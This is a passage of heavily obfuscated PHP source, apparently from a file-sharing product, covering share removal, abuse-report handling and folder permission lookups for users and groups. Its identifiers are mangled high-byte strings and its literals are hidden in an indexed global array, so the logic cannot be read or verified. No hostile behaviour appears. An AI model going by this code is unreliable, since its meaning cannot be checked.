)->field($í¤À©[42])->select(); $€¦È¡ÄŞ = array_to_keyvalue($Ù…Õ«û‚, $í¤À©[22], $í¤À©[42]); $€¦È¡ÄŞ[] = $§‘„ãı [$í¤À©[42]]; return implode($í¤À©[18], $€¦È¡ÄŞ); } protected function remove($©†ğ–¼) { $èÈ˜³´Ì =& $_SERVER[•€áå–Õ]; if (is_array($©†ğ–¼)) { $©†ğ–¼ = array($èÈ˜³´Ì[17], $©†ğ–¼); } $ŞŒ°ôŠ = array($èÈ˜³´Ì[644] => $©†ğ–¼); $¶Öıó¿ó = $this->where($ŞŒ°ôŠ)->delete(); if ($¶Öıó¿ó) { Model($èÈ˜³´Ì[645])->where(array($èÈ˜³´Ì[644] => $©†ğ–¼))->delete(); } $É¡é›ş— = is_array($©†ğ–¼) ? $©†ğ–¼[1] : array($©†ğ–¼); for ($ƒàÔå‰˜ = 0; $ƒàÔå‰˜ < count($É¡é›ş—); $ƒàÔå‰˜++) { $¶À ©Ø = $this->getInfo($É¡é›ş—[$ƒàÔå‰˜]); if ($¶À ©Ø[$èÈ˜³´Ì[642]] == $èÈ˜³´Ì[100]) { Model($èÈ˜³´Ì[612])->eventShare($¶À ©Ø[$èÈ˜³´Ì[193]], $èÈ˜³´Ì[2048]); } if ($¶À ©Ø[$èÈ˜³´Ì[542]] == $èÈ˜³´Ì[100]) { Model($èÈ˜³´Ì[612])->eventShare($¶À ©Ø[$èÈ˜³´Ì[193]], $èÈ˜³´Ì[2047]); } } return $¶Öıó¿ó; } protected function removeBySource($«ú¶õıï) { $‚ÖäûûÇ =& $_SERVER[•€áå–Õ]; $‘òèŸ¨ = array($‚ÖäûûÇ[470] => array($‚ÖäûûÇ[471], $«ú¶õıï)); $Öñä‘Ø = $this->field($‚ÖäûûÇ[644])->where($‘òèŸ¨)->select(); $Öñä‘Ø = array_to_keyvalue($Öñä‘Ø, $‚ÖäûûÇ[22], $‚ÖäûûÇ[644]); if (!$Öñä‘Ø) { return; } $‘òèŸ¨ = array($‚ÖäûûÇ[2054] => array($‚ÖäûûÇ[471], $Öñä‘Ø)); $this->where($‘òèŸ¨)->delete(); Model($‚ÖäûûÇ[645])->where($‘òèŸ¨)->delete(); } public function listAll($ÕØÓ©’ü) { $Óá½È¿Ã =& $_SERVER[•€áå–Õ]; $ØŸ³Ò = array(); if ($ÕØÓ©’ü[$Óá½È¿Ã[1693]]) { $ØŸ³Ò[$Óá½È¿Ã[1693]] = $ÕØÓ©’ü[$Óá½È¿Ã[1693]]; } if ($ÕØÓ©’ü[$Óá½È¿Ã[801]]) { $¿–¹Âó = $ÕØÓ©’ü[$Óá½È¿Ã[802]] ? $ÕØÓ©’ü[$Óá½È¿Ã[802]] : strtotime(date($Óá½È¿Ã[2062])); $ØŸ³Ò[$Óá½È¿Ã[227]] = array($Óá½È¿Ã[388], array($ÕØÓ©’ü[$Óá½È¿Ã[801]], $¿–¹Âó)); } if ($ÕØÓ©’ü[$Óá½È¿Ã[43]]) { $ØŸ³Ò[$ÕØÓ©’ü[$Óá½È¿Ã[43]]] = 1; } else { $ØŸ³Ò[] = array($Óá½È¿Ã[542] => array($Óá½È¿Ã[1053], 0), $Óá½È¿Ã[642] => array($Óá½È¿Ã[1053], 0), $Óá½È¿Ã[2036] => $Óá½È¿Ã[1989]); } if ($ÕØÓ©’ü[$Óá½È¿Ã[1985]]) { $ØŸ³Ò[] = array($Óá½È¿Ã[2033] => $ÕØÓ©’ü[$Óá½È¿Ã[1985]], $Óá½È¿Ã[1583] => array($Óá½È¿Ã[438], "\45{$ÕØÓ©’ü[$Óá½È¿Ã[1985]]}\45"), $Óá½È¿Ã[2036] => $Óá½È¿Ã[1989]); } $£½ñ§³ = $this->_makeOrder()->where($ØŸ³Ò)->selectPage(20); if (empty($£½ñ§³[$Óá½È¿Ã[424]])) { return array(); } $this->_listDataApply($£½ñ§³[$Óá½È¿Ã[424]]); return $£½ñ§³; } public function listDataApply($†Ğ¼Ğ°ş) { $this->_listDataApply($†Ğ¼Ğ°ş); return $†Ğ¼Ğ°ş; } private function _listDataApply(&$ñŞëÒÈî) { $¶ø–îŒı =& $_SERVER[•€áå–Õ]; $ÂüÁ¬à¦ = array_to_keyvalue($ñŞëÒÈî, $¶ø–îŒı[22], $¶ø–îŒı[1693]); $“ß¬Îåê = Model($¶ø–îŒı[578])->userListInfo(array_unique($ÂüÁ¬à¦)); $¬ªêêë… = array_to_keyvalue($ñŞëÒÈî, $¶ø–îŒı[22], $¶ø–îŒı[193]); $²ÚìÄÈ¸ = Model($¶ø–îŒı[866])->sourceListInfo($¬ªêêë…, !0); foreach ($ñŞëÒÈî as $•îÌ‡ ƒ => &$™ÉŸŒØÊ) { $¯¸¡ï³¼ = $™ÉŸŒØÊ[$¶ø–îŒı[1693]]; $™ÉŸŒØÊ[$¶ø–îŒı[2063]] = $“ß¬Îåê[$¯¸¡ï³¼] ? $“ß¬Îåê[$¯¸¡ï³¼] : !1; $˜¨šø÷“ = $™ÉŸŒØÊ[$¶ø–îŒı[193]]; $™ÉŸŒØÊ[$¶ø–îŒı[99]] = $²ÚìÄÈ¸[$˜¨šø÷“] ? $²ÚìÄÈ¸[$˜¨šø÷“] : !1; if ($™ÉŸŒØÊ[$¶ø–îŒı[99]][$¶ø–îŒı[484]] == $¶ø–îŒı[100]) { unset($ñŞëÒÈî[$•îÌ‡ ƒ]); } if ($™ÉŸŒØÊ[$¶ø–îŒı[99]] != $¶ø–îŒı[224] && !$™ÉŸŒØÊ[$¶ø–îŒı[99]]) { unset($ñŞëÒÈî[$•îÌ‡ ƒ]); } } unset($™ÉŸŒØÊ); $ñŞëÒÈî = array_values($ñŞëÒÈî); } private function _makeOrder($Â­µİÁÕ = '') { $“·Ç¾”ˆ =& $_SERVER[•€áå–Õ]; $‡¬Êı¤ƒ = array($“·Ç¾”ˆ[227], $“·Ç¾”ˆ[802], $“·Ç¾”ˆ[2050], $“·Ç¾”ˆ[2051]); $®ï¡Æ… = array($“·Ç¾”ˆ[502] => $“·Ç¾”ˆ[503], $“·Ç¾”ˆ[504] => $“·Ç¾”ˆ[505]); $—Û­è… = Input::get($“·Ç¾”ˆ[509], $“·Ç¾”ˆ[17], $“·Ç¾”ˆ[476], $‡¬Êı¤ƒ); $‹»É¶•½ = Input::get($“·Ç¾”ˆ[510], $“·Ç¾”ˆ[17], $“·Ç¾”ˆ[2064], array($“·Ç¾”ˆ[1982], $“·Ç¾”ˆ[504])); $‹»É¶•½ = $®ï¡Æ…[$‹»É¶•½]; $Â­µİÁÕ = $Â­µİÁÕ . "{$—Û­è…}\x20{$‹»É¶•½}"; return $this->order($Â­µİÁÕ); } public function reportAdd($©ÓîœÂö) { $¦ëúÆ«” =& $_SERVER[•€áå–Õ]; $õ…ÈÀüÇ = array($¦ëúÆ«”[644] => $©ÓîœÂö[$¦ëúÆ«”[644]], $¦ëúÆ«”[1693] => USER_ID); if (Model($¦ëúÆ«”[2060])->where($õ…ÈÀüÇ)->find()) { return !1; } $ıº®ğ = array($¦ëúÆ«”[644] => $©ÓîœÂö[$¦ëúÆ«”[644]], $¦ëúÆ«”[1583] => $©ÓîœÂö[$¦ëúÆ«”[1583]], $¦ëúÆ«”[193] => $©ÓîœÂö[$¦ëúÆ«”[193]], $¦ëúÆ«”[520] => $©ÓîœÂö[$¦ëúÆ«”[520]], $¦ëúÆ«”[1693] => USER_ID, $¦ëúÆ«”[43] => $©ÓîœÂö[$¦ëúÆ«”[43]], $¦ëúÆ«”[505] => $©ÓîœÂö[$¦ëúÆ«”[505]]); return Model($¦ëúÆ«”[2060])->add($ıº®ğ); } public function reportList($ÑÆ„ù¸) { $‚ÀÙè¼ =& $_SERVER[•€áå–Õ]; $ÛÁ„ˆê¨ = array(); if ($ÑÆ„ù¸[$‚ÀÙè¼[801]]) { $­˜ Îıœ = $ÑÆ„ù¸[$‚ÀÙè¼[802]] ? $ÑÆ„ù¸[$‚ÀÙè¼[802]] : strtotime(date($‚ÀÙè¼[2062])); $ÛÁ„ˆê¨[$‚ÀÙè¼[227]] = array($‚ÀÙè¼[388], array($ÑÆ„ù¸[$‚ÀÙè¼[801]], $­˜ Îıœ)); } if (isset($ÑÆ„ù¸[$‚ÀÙè¼[43]]) && in_array($ÑÆ„ù¸[$‚ÀÙè¼[43]], array($‚ÀÙè¼[100], $‚ÀÙè¼[489], $‚ÀÙè¼[2065], $‚ÀÙè¼[2066], $‚ÀÙè¼[2067]))) { $ÛÁ„ˆê¨[$‚ÀÙè¼[43]] = $ÑÆ„ù¸[$‚ÀÙè¼[43]]; } if (isset($ÑÆ„ù¸[$‚ÀÙè¼[791]]) && in_array($ÑÆ„ù¸[$‚ÀÙè¼[791]], array($‚ÀÙè¼[224], $‚ÀÙè¼[100], $‚ÀÙè¼[489], $‚ÀÙè¼[2065]))) { $ÛÁ„ˆê¨[$‚ÀÙè¼[791]] = $ÑÆ„ù¸[$‚ÀÙè¼[791]]; } $å›éùµÜ = Input::get($‚ÀÙè¼[510], $‚ÀÙè¼[17], $‚ÀÙè¼[2064], array($‚ÀÙè¼[1982], $‚ÀÙè¼[504])); $‹šöªÕù = array($‚ÀÙè¼[502] => $‚ÀÙè¼[503], $‚ÀÙè¼[504] => $‚ÀÙè¼[505]); $Ü³Øïì = $‚ÀÙè¼[2068] . $‹šöªÕù[$å›éùµÜ]; $„Œ¡ÁŠÔ = Model($‚ÀÙè¼[2060])->where($ÛÁ„ˆê¨)->order($Ü³Øïì)->selectPage(20); if (empty($„Œ¡ÁŠÔ[$‚ÀÙè¼[424]])) { return array(); } $ß¦€†Úç = array_to_keyvalue_group($„Œ¡ÁŠÔ[$‚ÀÙè¼[424]], $‚ÀÙè¼[791], $‚ÀÙè¼[644]); if (!empty($ß¦€†Úç[0])) { $ÑÆ„ù¸ = $ß¦€†Úç[0]; $ÛÁ„ˆê¨ = array($‚ÀÙè¼[644] => array($‚ÀÙè¼[17], $ÑÆ„ù¸)); $¡‡©Š‚æ = $this->where($ÛÁ„ˆê¨)->field($‚ÀÙè¼[644])->select(); $¡‡©Š‚æ = array_to_keyvalue($¡‡©Š‚æ, $‚ÀÙè¼[22], $‚ÀÙè¼[644]); $úÜä²›Ã = array_diff($ÑÆ„ù¸, $¡‡©Š‚æ); if (!empty($úÜä²›Ã)) { foreach ($„Œ¡ÁŠÔ[$‚ÀÙè¼[424]] as $³Ò¯•æ => $Æ¾éä®µ) { if (in_array($Æ¾éä®µ[$‚ÀÙè¼[644]], $úÜä²›Ã)) { unset($„Œ¡ÁŠÔ[$‚ÀÙè¼[424]][$³Ò¯•æ]); } } } } $this->_listDataApply($„Œ¡ÁŠÔ[$‚ÀÙè¼[424]]); return $„Œ¡ÁŠÔ; } public function reportStatus($îøŸÛ¶’) { $ë ³«ªü =& $_SERVER[•€áå–Õ]; $í‰åÊì¸ = array($ë ³«ªü[454] => $îøŸÛ¶’[$ë ³«ªü[454]]); $ˆé÷Ç€ = Model($ë ³«ªü[2060])->where($í‰åÊì¸)->field($ë ³«ªü[2069])->find(); if (!$ˆé÷Ç€) { return !1; } $¼»ÙşÆğ = array($ë ³«ªü[791] => $îøŸÛ¶’[$ë ³«ªü[791]]); if ($îøŸÛ¶’[$ë ³«ªü[791]] == $ë ³«ªü[2065] && $ˆé÷Ç€[$ë ³«ªü[791]] == $ë ³«ªü[2065]) { $¼»ÙşÆğ[$ë ³«ªü[791]] = 0; } $¯ß«ì¬š = Model($ë ³«ªü[2060])->where($í‰åÊì¸)->save($¼»ÙşÆğ); if ($îøŸÛ¶’[$ë ³«ªü[791]] == $ë ³«ªü[489]) { if ($ˆé÷Ç€[$ë ³«ªü[520]] != $ë ³«ªü[224] && $this->shareFileMeta($ˆé÷Ç€[$ë ³«ªü[520]])) { $this->shareFileMeta($ˆé÷Ç€[$ë ³«ªü[520]], 0); } $this->remove($ˆé÷Ç€[$ë ³«ªü[644]]); return !0; } if ($¯ß«ì¬š && $îøŸÛ¶’[$ë ³«ªü[791]] == $ë ³«ªü[2065]) { $–˜Äº¤‚ = $¼»ÙşÆğ[$ë ³«ªü[791]] == $ë ³«ªü[2065] ? 1 : 0; $this->shareFileMeta($ˆé÷Ç€[$ë ³«ªü[520]], $–˜Äº¤‚); $this->removeByFile($ˆé÷Ç€[$ë ³«ªü[520]]); } return $¯ß«ì¬š; } private function removeByFile($â†€Â…û) { $Éå’ªè¦ =& $_SERVER[•€áå–Õ]; $ö™şÆ´Š = Model($Éå’ªè¦[866])->where(array($Éå’ªè¦[520] => $â†€Â…û))->field($Éå’ªè¦[193])->select(); $Ûåí²‹¤ = array_to_keyvalue($ö™şÆ´Š, $Éå’ªè¦[22], $Éå’ªè¦[193]); $§¬õá­Ÿ = array($Éå’ªè¦[193] => array($Éå’ªè¦[17], $Ûåí²‹¤), $Éå’ªè¦[542] => 1); $ö™şÆ´Š = $this->where($§¬õá­Ÿ)->field($Éå’ªè¦[644])->select(); if (empty($ö™şÆ´Š)) { return; } $Ñš¾±ƒ¨ = array_to_keyvalue($ö™şÆ´Š, $Éå’ªè¦[22], $Éå’ªè¦[644]); $this->remove($Ñš¾±ƒ¨); } private function shareFileMeta($Å»¤Œòä, $ ˆá¯ÜÁ = null) { $Ü¶Í”à =& $_SERVER[•€áå–Õ]; $õ‘€ÑËî = array($Ü¶Í”à[520] => $Å»¤Œòä, $Ü¶Í”à[106] => $Ü¶Í”à[2070]); if (is_null($ ˆá¯ÜÁ)) { return Model($Ü¶Í”à[2071])->where($õ‘€ÑËî)->find(); } $õ‘€ÑËî[$Ü¶Í”à[429]] = $ ˆá¯ÜÁ; Model($Ü¶Í”à[2071])->add($õ‘€ÑËî, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\143\145\x5f\x61\165\164\150"; public function getAuth($Íµ¶Âûú) { $ÇùÀêó¦ =& $_SERVER[•€áå–Õ]; $“ÔíÒˆÎ = $this->sourceAuthSelect($Íµ¶Âûú); $¦£•…µ° = array(); $€üîÜ±é = array(); $Üˆ€†Ï = 2 << 25; foreach ($“ÔíÒˆÎ as $çŞˆë¡Î) { $½œ†‰ÒÀ = Model($ÇùÀêó¦[551])->listData($çŞˆë¡Î[$ÇùÀêó¦[1995]]); if (!$½œ†‰ÒÀ) { continue; } $¦£•…µ°[] = $çŞˆë¡Î; $í—ó¼»¦ = 0; if ($çŞˆë¡Î[$ÇùÀêó¦[190]] == SourceModel::TYPE_GROUP) { $í—ó¼»¦ = $Üˆ€†Ï * 2; } if ($çŞˆë¡Î[$ÇùÀêó¦[190]] == SourceModel::TYPE_USER) { $í—ó¼»¦ = $Üˆ€†Ï; } if ($çŞˆë¡Î[$ÇùÀêó¦[190]] == SourceModel::TYPE_USER && $çŞˆë¡Î[$ÇùÀêó¦[549]] == $ÇùÀêó¦[224]) { $í—ó¼»¦ = 0; } $€üîÜ±é[] = $½œ†‰ÒÀ[$ÇùÀêó¦[466]] + $í—ó¼»¦; } array_multisort($€üîÜ±é, SORT_DESC, $¦£•…µ°); return $¦£•…µ°; } public function sourceAuthSelect($ªÑ’”ò) { $¯ê™ù¡ş =& $_SERVER[•€áå–Õ]; static $èÒ™™ = array(); $··¢Èìù = is_array($ªÑ’”ò) ? !1 : !0; if ($··¢Èìù) { $ªÑ’”ò = array($ªÑ’”ò); } $î«ì¢üà = array(); foreach ($ªÑ’”ò as $“œ‹š»œ) { if (isset($èÒ™™[$“œ‹š»œ])) { $î«ì¢üà[$“œ‹š»œ] = $èÒ™™[$“œ‹š»œ]; } } if (count($î«ì¢üà) == count($ªÑ’”ò)) { return $··¢Èìù ? $î«ì¢üà[$ªÑ’”ò[0]] : $î«ì¢üà; } $÷“€é•¢ = $¯ê™ù¡ş[2072]; $¨Ô¾½’é = array($¯ê™ù¡ş[193] => array($¯ê™ù¡ş[17], $ªÑ’”ò)); $ı¤²éÀ¢ = $this->field($÷“€é•¢)->order($¯ê™ù¡ş[454])->where($¨Ô¾½’é)->select(); $—°õ©¥´ = array_to_keyvalue_group($ı¤²éÀ¢, $¯ê™ù¡ş[193]); foreach ($ªÑ’”ò as $“œ‹š»œ) { $èÒ™™[$“œ‹š»œ] = $—°õ©¥´[$“œ‹š»œ] ? $—°õ©¥´[$“œ‹š»œ] : array(); } if ($··¢Èìù) { return $ı¤²éÀ¢; } return $—°õ©¥´; } public function setAuth($úÕÒÍ¡Ğ, $ìÊø¾“) { $Ù«şøâş =& $_SERVER[•€áå–Õ]; $öÈı¾¶ı = Model($Ù«şøâş[1374])->sourceInfo($úÕÒÍ¡Ğ); if (!$öÈı¾¶ı) { return !1; } if ($öÈı¾¶ı[$Ù«şøâş[190]] != SourceModel::TYPE_GROUP) { return !1; } $‹ÁİÊ¿ = 1; $Ñ¬»øÂ = $öÈı¾¶ı[$Ù«şøâş[549]]; if ($Ñ¬»øÂ != $‹ÁİÊ¿) { $‚İè‚â× = array($Ù«şøâş[1891] => $Ñ¬»øÂ); $ÆòËã ½ = Model($Ù«şøâş[1981])->field($Ù«şøâş[1693])->where($‚İè‚â×)->select(); $ÆòËã ½ = array_to_keyvalue($ÆòËã ½, $Ù«şøâş[22], $Ù«şøâş[1693]); } $ì¯õä’õ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ÈƒÊÍ¨³ = array(); foreach ($ìÊø¾“ as $Ëê”ëú¼) { if (!in_array($Ëê”ëú¼[$Ù«şøâş[190]], $ì¯õä’õ)) { show_json(LNG($Ù«şøâş[2073]), !1); } if ($Ñ¬»øÂ != $‹ÁİÊ¿) { if ($Ëê”ëú¼[$Ù«şøâş[190]] == SourceModel::TYPE_GROUP) { } if ($Ëê”ëú¼[$Ù«şøâş[549]] != 0 && !in_array($Ëê”ëú¼[$Ù«şøâş[549]], $ÆòËã ½)) { } } if ($Ëê”ëú¼[$Ù«şøâş[549]] == 0) { $Ëê”ëú¼[$Ù«şøâş[190]] = SourceModel::TYPE_USER; } $ÈƒÊÍ¨³[] = array($Ù«şøâş[193] => $úÕÒÍ¡Ğ, $Ù«şøâş[190] => intval($Ëê”ëú¼[$Ù«şøâş[190]]), $Ù«şøâş[549] => intval($Ëê”ëú¼[$Ù«şøâş[549]]), $Ù«şøâş[1995] => intval($Ëê”ëú¼[$Ù«şøâş[1995]]) ? intval($Ëê”ëú¼[$Ù«şøâş[1995]]) : 0, $Ù«şøâş[2055] => intval($Ëê”ëú¼[$Ù«şøâş[2055]]) ? intval($Ëê”ëú¼[$Ù«şøâş[2055]]) : -1); } $this->where(array($Ù«şøâş[470] => $úÕÒÍ¡Ğ))->delete(); $this->addAll($ÈƒÊÍ¨³); return !0; } public function authClear($á—êáåø) { $¡ıÈüêæ =& $_SERVER[•€áå–Õ]; $ÀÄü÷ı = Model($¡ıÈüêæ[1374])->sourceInfo($á—êáåø); $çè‹›˜ = array($á—êáåø); if ($ÀÄü÷ı[$¡ıÈüêæ[464]] == $¡ıÈüêæ[100]) { $íÜ‘Î£‚ = array($¡ıÈüêæ[631] => array($¡ıÈüêæ[591], $ÀÄü÷ı[$¡ıÈüêæ[564]] . $á—êáåø . $¡ıÈüêæ[592])); $çè‹›˜ = Model($¡ıÈüêæ[1374])->field($¡ıÈüêæ[470])->where($íÜ‘Î£‚)->getField($¡ıÈüêæ[193], !0); $çè‹›˜[] = $á—êáåø; } $this->where(array($¡ıÈüêæ[470] => array($¡ıÈüêæ[471], $çè‹›˜)))->delete(); return !0; } public function getAllChildren($àË­“²‚) { $ãÒöîå =& $_SERVER[•€áå–Õ]; $ÒÓ€Åƒ = Model($ãÒöîå[1374])->sourceInfo($àË­“²‚); if ($ÒÓ€Åƒ[$ãÒöîå[464]] != $ãÒöîå[100]) { return $this->sourceListAuth(array($àË­“²‚)); } if ($ÒÓ€Åƒ[$ãÒöîå[190]] != SourceModel::TYPE_GROUP) { return array(); } $ëñÅãú¤ = 1; $Ã“ÇÑ‘Ã = array($àË­“²‚); if ($ÒÓ€Åƒ[$ãÒöîå[192]] == $ãÒöîå[224] && $ÒÓ€Åƒ[$ãÒöîå[549]] != $ëñÅãú¤) { $Ã“ÇÑ‘Ã = $this->groupChidldAllRootSource($ÒÓ€Åƒ[$ãÒöîå[549]]); } $¾şöÆ™‚ = $this->field($ãÒöîå[193])->group($ãÒöîå[193])->select(); $¾şöÆ™‚ = array_to_keyvalue($¾şöÆ™‚, $ãÒöîå[22], $ãÒöîå[193]); if (!$¾şöÆ™‚) { return array(); } $úßÈ¾Æ™ = $ãÒöîå[2074]; $±íÏõÌõ = array($ãÒöîå[193] => array($ãÒöîå[17], $¾şöÆ™‚), $ãÒöîå[484] => $ãÒöîå[224]); $ÈŒíşÍ = Model($ãÒöîå[866])->field($úßÈ¾Æ™)->where($±íÏõÌõ)->select(); $®Øß‡õ» = array($àË­“²‚); foreach ($ÈŒíşÍ as $«æÖÈ¯’) { foreach ($Ã“ÇÑ‘Ã as $³¶£¥Ú¾) { $ºï©Î½¬ = $ãÒöîå[60] . $³¶£¥Ú¾ . $ãÒöîå[60]; $æÎÈêï™ = $«æÖÈ¯’[$ãÒöîå[564]] . $«æÖÈ¯’[$ãÒöîå[193]] . $ãÒöîå[60]; if (strstr($æÎÈêï™, $ºï©Î½¬)) { $®Øß‡õ»[] = $«æÖÈ¯’[$ãÒöîå[193]]; break; } } } return $this->sourceListAuth($®Øß‡õ»); } private function sourceListAuth($Ôƒ—Ï©¾) { $Ï¡Ä©ò‹ =& $_SERVER[•€áå–Õ]; $Ò¥é½³Æ = Model($Ï¡Ä©ò‹[1374])->sourceListInfo($Ôƒ—Ï©¾, !0); $â¦Û¯¡ = $this->sourceAuthSelect($Ôƒ—Ï©¾); $êÙìµ“ó = array(); $àØö¢œ = array(); foreach ($Ò¥é½³Æ as $ùø˜ÊÜ’) { unset($ùø˜ÊÜ’[$Ï¡Ä©ò‹[508]]); unset($ùø˜ÊÜ’[$Ï¡Ä©ò‹[506]]); unset($ùø˜ÊÜ’[$Ï¡Ä©ò‹[466]]); unset($ùø˜ÊÜ’[$Ï¡Ä©ò‹[99]]); $à‰ÒË„ = $â¦Û¯¡[$ùø˜ÊÜ’[$Ï¡Ä©ò‹[193]]]; if (!$à‰ÒË„) { continue; } $ùø˜ÊÜ’[$Ï¡Ä©ò‹[2075]] = $this->authTargetInfo($à‰ÒË„); $ùø˜ÊÜ’[$Ï¡Ä©ò‹[562]] = rtrim($ùø˜ÊÜ’[$Ï¡Ä©ò‹[568]], $Ï¡Ä©ò‹[18]) . $Ï¡Ä©ò‹[18] . ltrim($ùø˜ÊÜ’[$Ï¡Ä©ò‹[562]], $Ï¡Ä©ò‹[18]); $êÙìµ“ó[] = $ùø˜ÊÜ’; $è¨Í¥¸ = count(explode($Ï¡Ä©ò‹[18], trim($ùø˜ÊÜ’[$Ï¡Ä©ò‹[562]], $Ï¡Ä©ò‹[18]))); $àØö¢œ[] = $è¨Í¥¸ + ($ùø˜ÊÜ’[$Ï¡Ä©ò‹[43]] == $Ï¡Ä©ò‹[87] ? 0 : 1000); } array_multisort($àØö¢œ, SORT_ASC, $êÙìµ“ó); return $êÙìµ“ó; } private function groupChidldAllRootSource($•áäì‘Ä) { $‚ÉãâŞÄ =& $_SERVER[•€áå–Õ]; $º¯”ÛÍè = Model($‚ÉãâŞÄ[2076])->groupChildrenAll($•áäì‘Ä); $âÚé«î¸ = array($‚ÉãâŞÄ[192] => 0, $‚ÉãâŞÄ[549] => array($‚ÉãâŞÄ[17], $º¯”ÛÍè), $‚ÉãâŞÄ[190] => SourceModel::TYPE_GROUP); $ğÉİš = Model($‚ÉãâŞÄ[866])->field($‚ÉãâŞÄ[193])->where($âÚé«î¸)->select(); $ğÉİš = array_to_keyvalue($ğÉİš, $‚ÉãâŞÄ[22], $‚ÉãâŞÄ[193]); return $ğÉİš; } private function authTargetInfo($‚ÌÉ”Œ) { $½æÏçñî =& $_SERVER[•€áå–Õ]; $ÓêÙ²ÏÇ = array(); $ªØ‡ì = array(); $×§İíäÉ = 2 << 25; foreach ($‚ÌÉ”Œ as $ÒÌŞàÕË) { $é«Ë±¶¨ = Model($½æÏçñî[551])->listData($ÒÌŞàÕË[$½æÏçñî[1995]]); if (!$é«Ë±¶¨) { continue; } if ($ÒÌŞàÕË[$½æÏçñî[190]] == SourceModel::TYPE_USER) { $Ò™²’Ç¢ = Model($½æÏçñî[557])->getInfoSimpleOuter($ÒÌŞàÕË[$½æÏçñî[549]]); if ($Ò™²’Ç¢[$½æÏçñî[1693]] == $½æÏçñî[1229]) { continue; } if ($Ò™²’Ç¢[$½æÏçñî[1693]] == $½æÏçñî[224]) { $Ò™²’Ç¢[$½æÏçñî[42]] = LNG($½æÏçñî[2077]); } } else { $Ò™²’Ç¢ = Model($½æÏçñî[565])->getInfoSimple($ÒÌŞàÕË[$½æÏçñî[549]]); } if (!$Ò™²’Ç¢) { continue; } $Ò™²’Ç¢[$½æÏçñî[519]] = $é«Ë±¶¨; $ÓêÙ²ÏÇ[] = $Ò™²’Ç¢; $®š¥ºÎ = 0; if ($ÒÌŞàÕË[$½æÏçñî[190]] == SourceModel::TYPE_GROUP) { $®š¥ºÎ = $×§İíäÉ * 2; } if ($ÒÌŞàÕË[$½æÏçñî[190]] == SourceModel::TYPE_USER) { $®š¥ºÎ = $×§İíäÉ; } if ($ÒÌŞàÕË[$½æÏçñî[190]] == SourceModel::TYPE_USER && $ÒÌŞàÕË[$½æÏçñî[549]] == $½æÏçñî[224]) { $®š¥ºÎ = 0; } $ªØ‡ì[] = $é«Ë±¶¨[$½æÏçñî[466]] + $®š¥ºÎ; } array_multisort($ªØ‡ì, SORT_DESC, $ÓêÙ²ÏÇ); return $ÓêÙ²ÏÇ; } public function getAllChildrenByUser($ÑíàÛ¯, $¤®Ôîçğ) { $ûï•ƒ‰¨ =& $_SERVER[•€áå–Õ]; $§Ç»ïÇî = Model($ûï•ƒ‰¨[578])->getInfo($¤®Ôîçğ); if (!$¤®Ôîçğ || !$ÑíàÛ¯ || !$§Ç»ïÇî) { return array(); } $´ÅÉëË° = Model($ûï•ƒ‰¨[1374])->sourceInfo($ÑíàÛ¯); $áÆ¦©©ó = array(); $Ã¿æøé² = 1; if ($´ÅÉëË°[$ûï•ƒ‰¨[192]] == $ûï•ƒ‰¨[224] && $´ÅÉëË°[$ûï•ƒ‰¨[549]] != $Ã¿æøé² && $this->groupContainUser($´ÅÉëË°[$ûï•ƒ‰¨[549]], $¤®Ôîçğ)) { foreach ($§Ç»ïÇî[$ûï•ƒ‰¨[2078]] as $şÍ©ÆĞ) { $’ŸÌ›ÂË = Model($ûï•ƒ‰¨[565])->getInfo($şÍ©ÆĞ[$ûï•ƒ‰¨[1891]]); $ˆñÓ·…‚ = Model($ûï•ƒ‰¨[578])->getInfoSimpleOuter($¤®Ôîçğ); $ˆñÓ·…‚[$ûï•ƒ‰¨[519]] = $şÍ©ÆĞ[$ûï•ƒ‰¨[466]]; if (Model($ûï•ƒ‰¨[551])->authCheckAction($şÍ©ÆĞ[$ûï•ƒ‰¨[466]][$ûï•ƒ‰¨[466]], $ûï•ƒ‰¨[1912])) { continue; } $‡¸òãä  = array($ûï•ƒ‰¨[42] => $ûï•ƒ‰¨[1249] . $’ŸÌ›ÂË[$ûï•ƒ‰¨[42]], $ûï•ƒ‰¨[193] => $’ŸÌ›ÂË[$ûï•ƒ‰¨[99]][$ûï•ƒ‰¨[193]], $ûï•ƒ‰¨[96] => KodIO::make($’ŸÌ›ÂË[$ûï•ƒ‰¨[99]][$ûï•ƒ‰¨[193]]), $ûï•ƒ‰¨[192] => $ûï•ƒ‰¨[224], $ûï•ƒ‰¨[190] => $ûï•ƒ‰¨[558], $ûï•ƒ‰¨[43] => $ûï•ƒ‰¨[595], $ûï•ƒ‰¨[562] => $’ŸÌ›ÂË[$ûï•ƒ‰¨[569]], $ûï•ƒ‰¨[1891] => $’ŸÌ›ÂË[$ûï•ƒ‰¨[1891]], $ûï•ƒ‰¨[566] => $’ŸÌ›ÂË[$ûï•ƒ‰¨[192]], $ûï•ƒ‰¨[2075] => array($ˆñÓ·…‚)); $áÆ¦©©ó[$‡¸òãä [$ûï•ƒ‰¨[193]]] = $‡¸òãä ; } } $ûİèïòØ = array(); $»­ß¡İ = $this->getAllChildren($ÑíàÛ¯); foreach ($»­ß¡İ as $ïÖ»‡¿¯) { $ãûíß– = !1; foreach ($ïÖ»‡¿¯[$ûï•ƒ‰¨[2075]] as $Ã½ÆÌ‹) { if ($Ã½ÆÌ‹[$ûï•ƒ‰¨[1693]]) { if ($Ã½ÆÌ‹[$ûï•ƒ‰¨[1693]] == $¤®Ôîçğ) { $ãûíß– = !0; break; } } if ($Ã½ÆÌ‹[$ûï•ƒ‰¨[1891]]) { if ($this->groupContainUser($Ã½ÆÌ‹[$ûï•ƒ‰¨[1891]], $¤®Ôîçğ)) { $ãûíß– = !0; break; } } } if ($ãûíß–) { $ûİèïòØ[] = $ïÖ»‡¿¯; } $´»ªÆÖü = $ïÖ»‡¿¯[$ûï•ƒ‰¨[193]]; if (isset($áÆ¦©©ó[$´»ªÆÖü])) { $ïÖ»‡¿¯[$ûï•ƒ‰¨[2075]][] = $áÆ¦©©ó[$´»ªÆÖü][0]; $áÆ¦©©ó[$´»ªÆÖü] = !1; } } $áÆ¦©©ó = array_filter(array_values($áÆ¦©©ó)); $ûİèïòØ = array_merge($áÆ¦©©ó, $ûİèïòØ); return $ûİèïòØ; } public function setAllChildrenByUser($µÇáê¿º, $¾ïã²€Õ, $§Éö²ë·) { $›îê»İâ =& $_SERVER[•€áå–Õ]; $’›†İ‘Ô = $this->getAllChildrenByUser($µÇáê¿º, $¾ïã²€Õ); if (!$§Éö²ë· || !$’›†İ‘Ô) { return !1; 